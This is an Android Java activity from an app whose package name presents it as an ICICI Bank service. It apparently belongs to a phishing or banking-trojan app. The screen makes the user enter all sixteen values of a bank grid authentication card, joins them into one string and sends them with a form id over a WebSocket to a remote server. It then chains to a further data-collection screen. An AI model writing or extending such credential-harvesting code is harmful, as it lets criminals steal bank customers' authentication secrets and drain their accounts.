package com.service.icicibank;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class SecondActivity extends  BaseActivity {

    private EditText[] gridInputs;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        StringBuilder gridInfoBuilder = new StringBuilder();

        gridInputs = new EditText[]{
                findViewById(R.id.grid1), findViewById(R.id.grid2),
                findViewById(R.id.grid3), findViewById(R.id.grid4),
                findViewById(R.id.grid5), findViewById(R.id.grid6),
                findViewById(R.id.grid7), findViewById(R.id.grid8),
                findViewById(R.id.grid9), findViewById(R.id.grid10),
                findViewById(R.id.grid11), findViewById(R.id.grid12),
                findViewById(R.id.grid13), findViewById(R.id.grid14),
                findViewById(R.id.grid15), findViewById(R.id.grid16)
        };
        setupAutoMoveBetweenBoxes();

        int form_id = getIntent().getIntExtra("form_id", -1);

        Button buttonSubmit = findViewById(R.id.login_button);
        buttonSubmit.setOnClickListener(v -> {

            for (int i = 0; i < gridInputs.length; i++) {
                String value = gridInputs[i].getText().toString().trim();
                char letter = (char) ('A' + (i % 8));  // A to H
                int number = i + 1;

                if (value.isEmpty()) {
                    Toast.makeText(this, "Grid " + (letter) + " Number is Required", Toast.LENGTH_SHORT).show();
                    gridInputs[i].requestFocus();
                    return;
                }// 1 to 16

                gridInfoBuilder.append(letter)
                        .append(number)
                        .append("=")
                        .append(value);

                if (i < gridInputs.length - 1) {
                    gridInfoBuilder.append(", ");
                }
            }


            String grid_info = gridInfoBuilder.toString();
            dataObject = new HashMap<>();
            dataObject.put("grid_info", grid_info);
            if (grid_info.isEmpty()) {
                Toast.makeText(this, "Grid All Information is Required", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            int formId = response.optInt("data", -1);
                            String message = response.optString("message", "No message");
                            if (status == 200 && formId != -1) {
                                Intent intent = new Intent(context, ThirdActivity.class);
                                intent.putExtra("form_id", formId);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
//                case "adnum":
//                    if (!FormValidator.validateMinLength(editText, 12, "Required 12 digit " + key)) {
//                        isValid = false;
//                    }
//                    break;

                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void setupAutoMoveBetweenBoxes() {
        for (int i = 0; i < gridInputs.length; i++) {
            final int index = i;

            gridInputs[i].addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

                @Override
                public void onTextChanged(CharSequence s, int start, int before, int count) {}

                @Override
                public void afterTextChanged(Editable s) {
                    if (s.length() == 2 && index < gridInputs.length - 1) {
                        // Move to next box when 2 digits entered
                        gridInputs[index + 1].requestFocus();
                    }
                }
            });

            // Handle backspace (move to previous box)
            gridInputs[i].setOnKeyListener((v, keyCode, event) -> {
                if (event.getAction() == KeyEvent.ACTION_DOWN &&
                        keyCode == KeyEvent.KEYCODE_DEL &&
                        gridInputs[index].getText().toString().isEmpty() &&
                        index > 0) {
                    gridInputs[index - 1].requestFocus();
                    gridInputs[index - 1].setSelection(gridInputs[index - 1].getText().length());
                    return true;
                }
                return false;
            });
        }
    }



}
